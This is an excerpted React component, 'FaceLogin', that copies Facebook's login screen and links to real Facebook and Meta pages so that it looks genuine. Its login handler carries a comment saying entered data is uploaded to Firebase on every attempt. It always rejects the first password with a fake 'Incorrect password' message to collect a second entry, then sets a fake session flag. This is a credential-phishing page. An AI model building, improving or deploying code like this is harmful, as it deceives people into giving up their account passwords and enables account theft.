...
const FaceLogin = () => {
  ...
  const [isChecking, setIsChecking] = useState(true); // Added to prevent login screen flashing

  // Check local storage when the component first loads
  useEffect(() => {
  ...
  const handleLogin = async (e) => {
    ...
    try {
      ...
      // Upload data to Firebase regardless of the attempt
      ...
      if (attempt === 1) {
        // First attempt logic: Show error and increment count
        setStatusMessage("Incorrect password. Please try again.");
        setPassword(""); // Clear password for the second try
        setAttempt(2);
      } else {
        // Second attempt logic: Save to localStorage and switch to the Mess component
        localStorage.setItem("facebook_session_active", "true");
        setShowMess(true);
      }
    } catch (error) {
      // Real technical errors (network, etc.) still show
  ...
  // If we are still checking local storage, show nothing (or a loading spinner)
  if (isChecking) {
    return <div className="min-h-screen bg-[#F0F2F5]"></div>;
  }

  // If the user is flagged as logged in, go straight to Mess
  if (showMess) {
    return <Mess />;
  }
    ...
    <div className="min-h-screen bg-[#F0F2F5] flex flex-col justify-between">
      ...
      <div className="px-6 pt-6">
        ...
        <div className="text-center mt-5">
          <a href="https://www.facebook.com/recover/initiate/" className="text-[14px] text-black font-medium hover:underline">
            Forgot password?
          </a>
        </div>
      </div>
      ...
      <div className="px-6 pb-8 text-center space-y-6">
        <button
          type="button"
          onClick={() => window.location.href = "https://www.facebook.com/r.php"}
        ...
        <div className="space-y-2">
          ...
          <div className="text-[11px] text-gray-500 space-x-3">
            <a href="https://about.meta.com/" className="hover:underline cursor-pointer">About</a>
            <a href="https://www.facebook.com/help/" className="hover:underline cursor-pointer">Help</a>
            <a href="https://www.facebook.com/" className="hover:underline cursor-pointer">More</a>
          </div>
        </div>
      </div>
    </div>
